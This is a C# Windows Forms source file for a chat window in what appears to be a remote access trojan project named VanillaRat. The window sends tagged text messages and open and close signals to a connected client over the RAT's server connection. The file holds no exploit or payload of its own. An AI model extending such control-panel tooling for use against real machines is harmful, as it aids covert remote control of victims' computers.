using System;
using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class Chat : Form
    {
        public Chat()
        {
            InitializeComponent();
            Update = true;
        }

        public int ConnectionID { get; set; }
        public bool Update { get; set; }

        //Send message by button
        private void btnSend_Click(object sender, EventArgs e)
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
            if (string.IsNullOrWhiteSpace(txtChat.Text))
                txtChat.Text = "You: " + txtSend.Text;
            else
                txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
            txtSend.Text = "";
        }

        //Send message by enter key
        private void txtSend_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
                if (string.IsNullOrWhiteSpace(txtChat.Text))
                    txtChat.Text = "You: " + txtSend.Text;
                else
                    txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
                txtSend.Text = "";
            }
        }

        //On form close
        private void Chat_FormClosing(object sender, FormClosingEventArgs e)
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("CloseChat"));
            Update = false;
        }

        //On form load
        private void Chat_Load(object sender, EventArgs e)
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]Opened chat"));
        }
    }
}